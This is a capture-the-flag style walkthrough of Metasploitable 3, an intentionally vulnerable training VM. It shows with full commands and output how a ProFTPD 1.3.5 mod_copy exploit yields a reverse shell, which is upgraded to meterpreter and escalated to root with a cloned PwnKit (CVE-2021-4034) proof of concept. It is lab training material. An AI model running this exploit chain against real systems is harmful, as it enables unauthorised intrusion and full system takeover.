# Metasploitable 3 Walkthrough
> Quasar | 2022

## Initial analysis:
Nmap scan: ``% nmap -T4 -Pn -oN nmap_ports.txt -sV 192.168.244.133`` where ``192.168.244.133`` is the IP address of the Virtual Machine
Results:
```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
8181/tcp closed intermapper
Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploitation
Let's try the first hit on metasploit:

``% msfconsole ``

```
msf6 > search proftpd
Matching Modules
================
   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
```

The 4th one seems promising as the version number (1.3.5) matches with the machine.

```
msf6 > use 4
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5
```

Now, the variables ``RHOSTS`` and the ``SITEPATH`` need to be corrected.

```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.244.133
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
```

Also, we need to set a payload for this exploit. This module only supports cmd/unix/* payloads.
```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set payload cmd/unix/
set payload cmd/unix/bind_awk            set payload cmd/unix/generic             set payload cmd/unix/reverse_perl_ssl
set payload cmd/unix/bind_perl           set payload cmd/unix/reverse_awk         set payload cmd/unix/reverse_python
set payload cmd/unix/bind_perl_ipv6      set payload cmd/unix/reverse_perl        set payload cmd/unix/reverse_python_ssl
```
Now:

```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set PAYLOAD cmd/unix/reverse_python
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST vmnet8
```
``vmnet8`` is my NAT interface (and for) which the listener will be listening on.

```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run

[*] Started reverse TCP handler on 192.168.244.1:4444 
[*] 192.168.244.133:80 - 192.168.244.133:21 - Connected to FTP server
[*] 192.168.244.133:80 - 192.168.244.133:21 - Sending copy commands to FTP server
[*] 192.168.244.133:80 - Executing PHP payload /UeJyDI.php
[*] Command shell session 1 opened (192.168.244.1:4444 -> 192.168.244.133:35430) at 2022-07-30 23:15:27 +0530

```

Success, we now have a shell to work with!

## Postexploitation
```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
[*] Starting interaction with 1...

bash -i
bash: cannot set terminal process group (1794): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ 
```

Now, let's try for a meterpreter:

```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    192.168.244.1    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on
```
This is the output after correcting the "blank spots/incorrect variables". Now, running it gives:

```
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Post module running as background job 0.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.244.1:4433 
[*] Sending stage (989032 bytes) to 192.168.244.133
[*] Meterpreter session 2 opened (192.168.244.1:4433 -> 192.168.244.133:49703) at 2022-07-30 23:36:49 +0530
[*] Command stager progress: 100.00% (773/773 bytes)

meterpreter > 
```

Cool!
Now, let's try to get root access on this machine.

We scan for any vulnerabilities using linpeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
Just download it from the web in the machine or upload it using the meterpreter.

```
meterpreter > upload CTF/Metasploitable3/uploads/linpeas.sh
[*] uploading  : /home/quasar/CTF/Metasploitable3/uploads/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 758.81 KiB (0.0%): /home/quasar/CTF/Metasploitable3/uploads/linpeas.sh -> linpeas.sh
[*] uploaded   : /home/quasar/CTF/Metasploitable3/uploads/linpeas.sh -> linpeas.sh
```

Now, running it inside the machine gives a lot of information about the it.

```
meterpreter > shell
cd /dev/shm
bash -i
www-data@ubuntu:/run/shm$ chmod +x linpeas.sh
www-data@ubuntu:/run/shm$ ./linpeas.sh
```

Immediately, linpeas pops up with a CVE number:

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```

Now, searching for the PoC's for the CVE in internet gave: https://github.com/arthepsy/CVE-2021-4034 (credits intended)
And we have git in the machine.

So,
```
www-data@ubuntu:/run/shm$ git clone https://github.com/arthepsy/CVE-2021-4034
Cloning into 'CVE-2021-4034'...
www-data@ubuntu:/run/shm$ ls
CVE-2021-4034
linpeas.sh
www-data@ubuntu:/run/shm$ cd CVE-2021-4034
www-data@ubuntu:/run/shm/CVE-2021-4034$ ls
README.md
cve-2021-4034-poc.c
www-data@ubuntu:/run/shm/CVE-2021-4034$ cc cve-2021-4034-poc.c
www-data@ubuntu:/run/shm/CVE-2021-4034$ ./a.out
bash -i
bash: cannot set terminal process group (1794): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/run/shm/CVE-2021-4034# whoami
root
```

And we got root access for the machine.
